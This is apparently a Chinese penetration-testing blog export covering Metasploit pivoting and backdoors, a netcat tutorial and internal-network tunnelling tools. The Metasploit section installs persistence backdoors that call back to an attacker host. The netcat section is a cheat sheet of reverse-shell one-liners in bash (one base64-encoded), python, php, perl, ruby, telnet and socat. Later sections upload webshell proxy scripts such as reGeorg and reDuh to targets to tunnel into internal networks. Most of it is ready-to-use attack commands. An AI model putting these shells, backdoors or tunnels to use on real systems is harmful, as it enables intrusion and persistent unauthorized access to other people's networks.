<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21969.png" alt="0"></p>
<p>常用参数：</p>
<p>-l：本地监听端口</p>
<p>-r：内网目标的ip</p>
<p>-p：内网目标的端口</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22072.png" alt="0"></p>
<p>上面命令执行之后，会将10.1.1.3的3389端口转发到本地的2222端口。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21977.png" alt="0"></p>
<p><strong>2.pivot</strong></p>
<p>pivot是msf最常用的代理，可以让我们使用msf提供的扫描模块对内网进行探测。</p>
<p><strong>(1)首先需要在msf的操作界面下添加一个路由表。</strong></p>
<p>添加命令：route add 内网ip 子网掩码 session的id</p>
<p><strong>打印命令：**</strong>route print**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22075.png" alt="0"></p>
<p>路由添加成功之后就可以在msf里访问10.1.1.0/24这个网段。</p>
<p><strong>(2)建立socks代理。</strong></p>
<p>如果其它程序需要访问这个内网环境，就可以建立socks代理。</p>
<p>msf提供了3个模块用来做socks代理。</p>
<p>auxiliary/server/socks4a</p>
<p>use auxiliary/server/socks5</p>
<p>use auxiliary/server/socks_unc</p>
<p>以auxiliary/server/socks4a为例，查看需要设置的参数。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22077.png" alt="0"></p>
<p>一共两个参数：</p>
<p><strong>SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。</strong></p>
<p><strong>SRVPORT：监听的端口，默认为1080。</strong></p>
<p><strong>直接运行run命令，就可以成功创建一个socks4代理隧道，在linux上可以配置**</strong>proxychains<strong><strong>使用，在windows可以配置</strong></strong>Proxifier<strong>**进行使用。</strong></p>
<p><strong>九、后门</strong></p>
<p>Meterpreter的shell运行在内存中，目标重启就会失效，如果管理员给系统打上补丁，那么就没办法再次使用exploit获取权限，所以需要持久的后门对目标进行控制。</p>
<p>Msf提供了两种后门，一种是metsvc(通过服务启动)，一种是persistence(支持多种方式启动)。</p>
<p><strong>1.metsvc</strong></p>
<p><strong>(1) 使用run metsvc -h查看帮助，一共有三个参数。</strong></p>
<p>-A：安装后门后，自动启动exploit/multi/handler模块连接后门</p>
<p>-h：查看帮助</p>
<p>-r：删除后门</p>
<p><strong>(2) 安装后门</strong></p>
<p><strong>命令：**</strong>run metsvc**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22079.png" alt="0"></p>
<p>命令运行成功后会在C:WindowsTEMP目录下新建随机名称的文件夹，里面生成3个文件（metsvc.dll、metsvc-server.exe、metsvc.exe）。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22005.png" alt="0"></p>
<p>同时会新建一个服务，显示名称为Meterpreter，服务名称为metsvc，启动类型为”自动”,绑定在31337端口。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22081.png" alt="0"></p>
<p><strong>(3) 连接后门</strong></p>
<p>使用exploit/multi/handler模块，payload设置为windows/metsvc_bind_tcp，设置目标ip和绑定端口31337。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22083.png" alt="0"></p>
<p><strong>2.persistence</strong></p>
<p><strong>(1) 使用run persistence -h查看参数。</strong></p>
<p>-A：安装后门后，自动启动exploit/multi/handler模块连接后门</p>
<p>-L：自启动脚本的路径，默认为%TEMP%</p>
<p>-P：需要使用的payload，默认为windows/meterpreter/reverse_tcp</p>
<p>-S：作为一个服务在系统启动时运行（需要SYSTEM权限）</p>
<p>-T：要使用的备用可执行模板</p>
<p>-U：用户登陆时运行</p>
<p>-X：系统启动时运行</p>
<p>-i：后门每隔多少秒尝试连接服务端</p>
<p>-p：服务端监听的端口</p>
<p>-r：服务端ip</p>
<p><strong>(2) 生成后门</strong></p>
<p><strong>命令：**</strong>run persistence -X -i 10 -r 192.168.1.9 -p 4444**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22085.png" alt="0"></p>
<p><strong>(3) 连接后门</strong></p>
<p>使用exploit/multi/handler模块，payload设置为windows/meterpreter/reverse_tcp，同时设置好服务端监听ip和端口。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22087.png" alt="0"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>MSF</tag>
        <tag>后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>nc使用详解</title>
    <url>/2020/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/nc%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="NC概述"><a href="#NC概述" class="headerlink" title="NC概述:"></a>NC概述:</h2><ul>
<li>nc又名netcat，一个简单而有用的工具，可以干很多事情，但是不可以吃。</li>
<li>何为反弹shell？为什么不反弹攻击?<br>相信你有一天可以直接把所有攻击反弹回去的.</li>
</ul>
<a id="more"></a>

<p><strong>常用命令</strong></p>
<p>banner获取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv ip port</span><br></pre></td></tr></table></figure>

<p>连接远程主机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvv ip port</span><br></pre></td></tr></table></figure>

<p>端口扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -v ip port            &#x2F;&#x2F;指定端口</span><br><span class="line">nc -v -z  ip 1-1555         &#x2F;&#x2F;指定端口段</span><br></pre></td></tr></table></figure>

<p>文件传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc  -lvp  8888 &lt; test.txt  服务端</span><br><span class="line">nc -nv 服务端ip 8888 &gt; test.txt 客户端</span><br></pre></td></tr></table></figure>

<h1 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h1><p>正向shell：客户端想要获取服务器shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	客户端监听</span><br><span class="line">nc -lvp 8888 -e &#x2F;bin&#x2F;sh </span><br><span class="line">nc -lvp 8888 -e c:\windows\system32\cmd.exe </span><br><span class="line">	服务端反弹</span><br><span class="line">	nc 服务端ip 8888</span><br></pre></td></tr></table></figure>

<p>反向shell：服务端想要获取客户端器shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端监听</span><br><span class="line">nc -lvp 8888 </span><br><span class="line">服务端反弹</span><br><span class="line">nc ip 8888 -e &#x2F;bin&#x2F;sh </span><br><span class="line">nc ip 8888 -e c:\windows\system32\cmd.exe </span><br></pre></td></tr></table></figure>

<p>没有nc是，由于各种环境不同，可以结合天时地利人和。</p>
<ul>
<li>Bash</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">base64版 </span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMzUvNzg5MCAwPiYx|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<ul>
<li>python</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<ul>
<li>php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<ul>
<li>perl</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Socket;$i&#x3D;&quot;ip&quot;;$p&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<ul>
<li>ruby</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;ip&quot;,port).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<ul>
<li>nc反弹nc</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash ip port</span><br></pre></td></tr></table></figure>

<ul>
<li>Netcat</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc ip port &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure>

<ul>
<li>Telnet</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TF&#x3D;$(mktemp -u); mkfifo $TF &amp;&amp; telnet ip port 0&lt;$TF | &#x2F;bin&#x2F;sh 1&gt;$TF</span><br></pre></td></tr></table></figure>

<p>socat</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:106.xxx.xxx.115:9999</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>NC</tag>
      </tags>
  </entry>
  <entry>
    <title>代理转发</title>
    <url>/2020/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>代理转发就是将一个端口，端口可以为主机端口也可以是访问到的人以主机的端口，转发到任意一台可以访问到的IP上</p>
<h2 id="区分正向连接和反向连接"><a href="#区分正向连接和反向连接" class="headerlink" title="区分正向连接和反向连接"></a>区分正向连接和反向连接</h2><ul>
<li>正向连接：你的机器连接目标机器</li>
<li>反向连接：目标机器反连你的机器（当防火墙设置端口过滤的话使用）</li>
<li>不论映射，还是转发，都有正有反，原理相同</li>
</ul>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913231620854.png" alt="img"></p>
<a id="more"></a>

<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><p>nc的正向连接：</p>
<p>  在公网服务器上监听他的cmd.exe 命令为：nc.exe -l -p 4444 -e cmd.exe</p>
<p>  在攻击者上监听nc -vv 公网服务器ip 4444</p>
<p>  可以获取到公网服务器的cmd</p>
<p>nc的反向代理：</p>
<p>  在公网服务器上监听自己的4444端口：nc.exe -lvp 4444</p>
<p>  在内网主机中进行：nc -t -e cmd.exe 公网ip 4444</p>
<p>  公网可成功获取内网cmd</p>
<h3 id="LCX"><a href="#LCX" class="headerlink" title="LCX"></a>LCX</h3><p>LCX的内网端口转发（防火墙做过滤不允许别人连接自己的3389）</p>
<p>  内网执行lcx.exe -slave 公网ip 4444 127.0.0.1 3389  内网将自己的3389端口转发到公网的4444端口</p>
<p>  公网主机监听自己端口 lcx.exe -listen 4444 5555</p>
<p>则攻击者连接公网ip的5555端口即可连接上内网的3389</p>
<p>LCX的本地端口转发（防火墙做过滤不允许自己的3389连接出去）</p>
<p>  防火墙限制，部分端口无法通过防火墙，可以将目标主机的3389端口传到允许的其他端口比如53，则在目标主机执行：lcx -tran 53 目标主机ip 3389</p>
<p>  可以直接连接目标主机的ip:53</p>
<h3 id="ew做代理"><a href="#ew做代理" class="headerlink" title="ew做代理"></a>ew做代理</h3><p>①<strong>首先在VPS上做相应的代理监听：</strong></p>
<p><strong>./ew_for_Linux32 -s rcsocks -l 1008 -e 888</strong></p>
<p><strong>在VPS上 监听888端口 并加端口转发给 本地的 1008端口</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/19627.png" alt="0"></p>
<p>② <strong>在客户端(内网环境)连接VPS的888端口</strong></p>
<p><strong>ew_for_Win.exe -s rssocks -d 104.224.150.102 -e 888</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/19653.png" alt="0"></p>
<p>🌂<strong>利用相应的代理软件 来监听 VPS的1008端口既可以进行内网穿透式连接</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/19655.png" alt="0"></p>
<h3 id="利用frp做代理"><a href="#利用frp做代理" class="headerlink" title="利用frp做代理"></a>利用frp做代理</h3><p>download：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
<p>①<strong>首先在VPS上做如下配置：</strong></p>
<p><strong>修改 frps.ini</strong></p>
<p><strong>bind_port = 8080</strong></p>
<p><strong>privilege_token = pentest999</strong></p>
<p><strong>运行 nohup ./frps -c frps.ini &amp;</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/19664.png" alt="0"></p>
<p>②<strong>在客户端上做如下配置：</strong></p>
<p><strong>修改 frpc.ini</strong></p>
<p><strong>[common]</strong></p>
<p><strong>server_addr = vps ip</strong></p>
<p><strong>server_port = 8080</strong></p>
<p><strong>privilege_token = pentest999</strong></p>
<p><strong>[plugin_socks5]</strong></p>
<p><strong>type = tcp</strong></p>
<p><strong>remote_port = 8081</strong></p>
<p><strong>plugin = socks5</strong></p>
<p><strong>plugin_user = ptest33333</strong></p>
<p><strong>plugin_passwd = ptest66666</strong></p>
<p><strong>运行 frpc -c fprc.ini</strong></p>
<p><strong>🌂利用相应的socks5代理连接 VPS的 8081端口即可</strong></p>
<h3 id="ssh-隧道代理转发"><a href="#ssh-隧道代理转发" class="headerlink" title="ssh 隧道代理转发"></a>ssh 隧道代理转发</h3><p>ssh 有三个强大的端口转发命令，分别是本地转发、远程转发、动态转发。</p>
<p>本地访问127.0.0.1:port1就是host:port2(用的更多)<br><code>ssh -CfNg -L port1:127.0.0.1:port2 user@host</code> #本地转发<br>访问host:port2就是访问127.0.0.1:port1<br><code>ssh -CfNg -R port2:127.0.0.1:port1 user@host</code> #远程转发<br>可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口<br><code>ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip</code> #正向隧道 监听本地port 可以将dmz_host的hostport端口转发到remote_ip的port端口<br><code>ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip</code> #反向隧道<br>用于内网穿透防火墙限制之类<br>socket 代理: <code>ssh -qTfnN -D port remotehost</code></p>
<h3 id="毒刺Stinger进行端口转发"><a href="#毒刺Stinger进行端口转发" class="headerlink" title="毒刺Stinger进行端口转发"></a>毒刺Stinger进行端口转发</h3><p><strong>端口转发</strong></p>
<ol>
<li>将stinger_server和proxy.php上传到目标服务器,确保 <a href="http://192.168.1.106:81/proxy.php可以访问,页面返回">http://192.168.1.106:81/proxy.php可以访问,页面返回</a> stinger XXX!</li>
<li>目标服务器执行如下命令启动代理服务(使用菜刀执行命令时可以添加start /b 或&amp; 后台运行,确保服务端7000端口未被占用)</li>
</ol>
<p>PS C:\Users\test\Desktop&gt; .\stinger_server_win_x64.exe -listen 127.0.0.1:7000 -username test -password testpass</p>
<ol>
<li>本地PC执行如下命令连接代理脚本</li>
</ol>
<p>stinger_client_win_x64.exe -local 127.0.0.1:1080 -proxy_server <a href="http://192.168.1.106:81/proxy.php">http://192.168.1.106:81/proxy.php</a> -remote_server <a href="http://127.0.0.1:7000">http://127.0.0.1:7000</a> -remote 127.0.0.1:3389 -username test -password testpass</p>
<ol>
<li>此时已经将192.168.1.106的3389端口映射到了你本地pc的1080端口</li>
</ol>
<p><strong>SOCK5代理</strong></p>
<ol>
<li>将stinger_server和proxy.php上传到目标服务器,确保 <a href="http://192.168.1.106:81/proxy.php可以访问,页面返回">http://192.168.1.106:81/proxy.php可以访问,页面返回</a> stinger XXX!</li>
<li>目标服务器执行如下命令启动代理服务(使用菜刀执行命令时可以添加start /b 或&amp; 后台运行,确保服务端7000,8000端口未被占用)</li>
</ol>
<p>PS C:\Users\test\Desktop&gt; .\stinger_server_win_x64.exe -listen 127.0.0.1:7000 -username test -password testpass -socks5Addr 127.0.0.1:8000</p>
<ol>
<li>本地PC执行如下命令连接代理脚本</li>
</ol>
<p>stinger_client_win_x64.exe -local 127.0.0.1:1080 -proxy_server <a href="http://192.168.1.106:81/proxy.php">http://192.168.1.106:81/proxy.php</a> -remote_server <a href="http://127.0.0.1:7000">http://127.0.0.1:7000</a> -remote 127.0.0.1:8000 -username test -password testpass</p>
<ol>
<li>此时你本地PC已经在1080生成一个SOCKS5代理,可以使用该代理访问目标内网</li>
</ol>
<p><strong>已测试</strong></p>
<p><strong>stinger_server\stinger_client</strong></p>
<ul>
<li>windows</li>
<li>linux</li>
</ul>
<p><strong>proxy.jsp/php/aspx</strong></p>
<ul>
<li>php7.2</li>
<li>tomcat7.0</li>
<li>iis8.0</li>
</ul>
<p><strong>已知问题</strong></p>
<ul>
<li>client端的socket连接无法自动释放</li>
</ul>
<p><strong>结语</strong></p>
<ul>
<li>php是最好的语言</li>
<li>啊D是最好的渗透测试工具</li>
</ul>
<h3 id="reGeorg端口转发"><a href="#reGeorg端口转发" class="headerlink" title="reGeorg端口转发"></a>reGeorg端口转发</h3><p>reGeorg不用多介绍了，内网渗透中常用工具之一。小白经常用于渗透测试中的内网转发，主要是因为方便实用。这个工具需要配合</p>
<p>proxifier,使用的socks5代理进行运用的。标红的是我们需要的脚本，根据自己的需要结合实际测试环境来选用的。 </p>
<p>首先我们现经代理脚本上传到服务器，实验的环境是jsp的，所以上传代理脚本tunnel.nosocket.jsp，然后我们在浏览器访问一下，如果出现以下提示就说明代理成功。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913233151005.png" alt="image-20200913233151005"></p>
<p>上传代理脚本成功后，我们打开proxifier进行配置参数，代理的端口默认是8888，代理的规则我们设置为谷歌浏览器，如果其它的不需要可以去掉勾：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913233205362.png" alt="image-20200913233205362"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913233216450.png" alt="image-20200913233216450"></p>
<p>上述代理参数配置完毕后，我们在cmd输入一下命令就会出现下面的界面:python2.exe reGeorgSocksProxy.py -p 8888 -u<a href="http://xxxx:8888/tran.jsp。这样的话我们就把内网的流量代理到外面，我们下一步就可以使用扫描工具进行内网的横向扫描。就这么简单直接。如果内网中的3389只能是内网进行连接的话，我们可以使用mstsc.exe通过代理进行连接3389远程桌面，其它的端口都是一样的道理，灵活运用即可。">http://xxxx:8888/tran.jsp。这样的话我们就把内网的流量代理到外面，我们下一步就可以使用扫描工具进行内网的横向扫描。就这么简单直接。如果内网中的3389只能是内网进行连接的话，我们可以使用mstsc.exe通过代理进行连接3389远程桌面，其它的端口都是一样的道理，灵活运用即可。</a></p>
<h3 id="Tunna端口转发"><a href="#Tunna端口转发" class="headerlink" title="Tunna端口转发"></a>Tunna端口转发</h3><p>Tunna这个工具使用起来也特方便，脚本的编写也是基于Python2版本。运用的时候也需要我们把代理脚本上传到目标服务器，然后通过代理内网的某个端口，注意这个工具只能代理一个端口，有点局限性。但是我们可以代理3389、22、3306、1433等敏感端口，然后将敏感端口流量转发了外网的的某个端口，我们再通过本地连接外网的端口进行连接，这样的话我们就可以使用了。</p>
<p>第一步：我们将代理脚本上传到目标服务器，在浏览器访问代理脚本是否被解析</p>
<p>第二步：运行proxy.py 并指定端口 python proxy.py -u<a href="http://219.x.x.x/conn.jsp">http://192.168.205.143/conn.php </a>-l 1234 -r 3389 -v</p>
<p>第三步：本地执行rdesktop 127.0.0.1:1234</p>
<h3 id="reDuh端口转发"><a href="#reDuh端口转发" class="headerlink" title="reDuh端口转发"></a>reDuh端口转发</h3><p>reDuh也是一款内网渗透利器，这个工具可以把内网服务器的端口通过http/https隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。服务端是个webshell，工具里面针对不同服务器有aspx,php,jsp三个版本，客户端是java写的，本机执行最好装上JDK软件。</p>
<p>我们将代理脚本上传到目标服务器，在本地访问代理脚本</p>
<p>这样我们执行一下三条命令就可以成功将目标主机的3389端口代理到本地的1234端口，本地连接1234端口就可以登陆内网服务器。</p>
<p>java -jar reDuhClient.ja r<a href="http://somesite.com/reDuh.php">http://somesite.com/reDuh.php</a></p>
<p>本地连接1010端口</p>
<p>nc -vv localhost 1010</p>
<p>连接成功会有欢迎提示，之后输入命,在java命令窗口执行</p>
<p>[createTunnel]1234:127.0.0.1:3389</p>
<h3 id="基于powershell的socks代理"><a href="#基于powershell的socks代理" class="headerlink" title="基于powershell的socks代理"></a>基于powershell的socks代理</h3><p>介绍github：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;p3nt4&#x2F;Invoke-SocksProxy&#x2F;master&#x2F;Invoke-SocksProxy.psm1</span><br></pre></td></tr></table></figure>

<p>在1234端口创建一个Socks 4/5 代理:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line"></span><br><span class="line">Invoke-SocksProxy -bindPort 1234</span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105450022-144254035.png" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105454678-661386867.png" alt="img"></p>
<p>效果:</p>
<p>这里用同网段的另一个win7，使用Proxifer去使用靶机的1234端口进行socks代理</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105508839-410586839.png" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105513706-1137528557.png" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105517733-108622092.png" alt="img"></p>
<p>增加线程(默认是200,增加到400,默认端口1080)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line"></span><br><span class="line">Invoke-SocksProxy -threads 400</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105536542-1886506584.png" alt="img"></p>
<h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><blockquote>
<p>nps是一款轻量级、高性能、功能强大的<strong>内网穿透</strong>代理服务器。目前支持<strong>tcp、udp流量转发</strong>，可支持任何<strong>tcp、udp</strong>上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还<strong>支持内网http代理、内网socks5代理</strong>、<strong>p2p等</strong>，并带有功能强大的web管理端。</p>
</blockquote>
<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><ol>
<li>做微信公众号开发、小程序开发等—-&gt; 域名代理模式</li>
<li>想在外网通过ssh连接内网的机器，做云服务器到内网服务器端口的映射，—-&gt; tcp代理模式</li>
<li>在非内网环境下使用内网dns，或者需要通过udp访问内网机器等—-&gt; udp代理模式</li>
<li>在外网使用HTTP代理访问内网站点—-&gt; http代理模式</li>
<li>搭建一个内网穿透ss，在外网如同使用内网vpn一样访问内网资源或者设备—-&gt; socks5代理模式</li>
</ol>
<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul>
<li>协议支持全面，兼容几乎所有常用协议，例如tcp、udp、http(s)、socks5、p2p、http代理…</li>
<li>全平台兼容(linux、windows、macos、群辉等)，支持一键安装为系统服务</li>
<li>控制全面，同时支持服务端和客户端控制</li>
<li>https集成，支持将后端代理和web服务转成https，同时支持多证书</li>
<li>操作简单，只需简单的配置即可在web ui上完成其余操作</li>
<li>展示信息全面，流量、系统信息、即时带宽、客户端版本等</li>
<li>扩展功能强大，该有的都有了（缓存、压缩、加密、流量限制、带宽限制、端口复用等等）</li>
<li>域名解析具备自定义header、404页面配置、host修改、站点保护、URL路由、泛解析等功能</li>
<li>服务端支持多用户和用户注册功能</li>
</ul>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p><a href="https://github.com/ehang-io/nps/releases">releases</a></p>
<h4 id="服务端启动"><a href="#服务端启动" class="headerlink" title="服务端启动"></a>服务端启动</h4><p>下载完服务器压缩包后，解压，然后进入解压后的文件夹</p>
<ul>
<li>执行安装命令</li>
</ul>
<p>对于linux|darwin <code>sudo ./nps install</code></p>
<p>对于windows，管理员身份运行cmd，进入安装目录 <code>nps.exe install</code></p>
<ul>
<li>默认端口</li>
</ul>
<p>nps默认配置文件使用了80，443，8080，8024端口</p>
<p>80与443端口为域名解析模式默认端口</p>
<p>8080为web管理访问端口</p>
<p>8024为网桥端口，用于客户端与服务器通信</p>
<ul>
<li>启动</li>
</ul>
<p>对于linux|darwin <code>sudo nps start</code></p>
<p>对于windows，管理员身份运行cmd，进入程序目录 <code>nps.exe start</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装后windows配置文件位于 C:\Program Files\nps，linux和darwin位于&#x2F;etc&#x2F;nps</span><br></pre></td></tr></table></figure>

<p><strong>如果发现没有启动成功，可以查看日志(Windows日志文件位于当前运行目录下，linux和darwin位于/var/log/nps.log)</strong></p>
<ul>
<li>访问服务端ip:web服务端口（默认为8080）</li>
<li>使用用户名和密码登陆（默认admin/123，正式使用一定要更改）</li>
<li>创建客户端</li>
</ul>
<h4 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h4><ul>
<li>点击web管理中客户端前的+号，复制启动命令</li>
<li>执行启动命令，linux直接执行即可，windows将./npc换成npc.exe用cmd执行</li>
</ul>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><ul>
<li>客户端连接后，在web中配置对应穿透服务即可</li>
</ul>
<h4 id="更多用法以及详细教程"><a href="#更多用法以及详细教程" class="headerlink" title="更多用法以及详细教程"></a>更多用法以及详细教程</h4><p><a href="https://ehang-io.github.io/nps/#/">https://ehang-io.github.io/nps/#/</a></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>代理转发</tag>
      </tags>
  </entry>
  <entry>
    <title>安恒信息 渗透攻击红队百科全书</title>
    <url>/2020/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AF-%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一章  信息搜集</span><br><span class="line">1.1   主机发现</span><br><span class="line">1.2   关联信息生成</span><br><span class="line">1.3   开放漏洞情报</span><br><span class="line">1.4   开源情报信息搜集(OSINT)</span><br><span class="line">1.5   Github Hacking</span><br><span class="line">1.6   Google Hacking</span><br><span class="line">1.7   Gitlcret</span><br><span class="line">1.8   Mailsniper.psl获取Outlook所有联系人</span><br><span class="line">1.9   内网渗透之信息收集</span><br><span class="line">1.10   后渗透信息收集之Wmic命令的一些使用方法</span><br><span class="line">1.ll   内网横向常见端口</span><br><span class="line">第二章  打点内网</span><br><span class="line">2.1       外部接入点</span><br><span class="line">2.1.1     无线攻击实战应用之DNSSpoof.Evil Portal.DWall组合拳入侵</span><br><span class="line">2.2       应用系统漏洞利用</span><br><span class="line">2.2.1     常见漏洞扫描</span><br><span class="line">2.2.1.1   Impacket框架之Mssql服务器安全检测</span><br><span class="line">2.2.1.2   MS17_010 py脚本利用</span><br><span class="line">2.2.2     未授权访问漏洞</span><br><span class="line">2.2.2.1   未授权漏洞总结</span><br><span class="line">2.2.2.2   JBOSS未授权访问</span><br><span class="line">2.2.3     远程代码执行漏洞</span><br><span class="line">2.2.3.1   Java下奇怪的命令执行</span><br><span class="line">2.2.3.2   Shiro反序列化记录</span><br><span class="line">2.2.3.3   RMI列化</span><br><span class="line">2.2.3.4   JNDI注入</span><br><span class="line">2.2.3.5   Fastjson 漏洞浅析</span><br><span class="line">2.2.3.6   CVE19043 PHP 远程代码执行复现</span><br><span class="line">2,2.3.7   Java WebsheIl从入门到入狱系列1基础篇</span><br><span class="line">2.2.3.8   深究XMl.decoder</span><br><span class="line">2.2:3.9   Fast.Json度序列化学习</span><br><span class="line">2.2.3.10   Oracle数据库安全思考之Xml反序列化</span><br><span class="line">2.2.3.11   Webshe11绕安全模式执行命令</span><br><span class="line">2.2.3.I2   Java 下的XXE漏洞</span><br><span 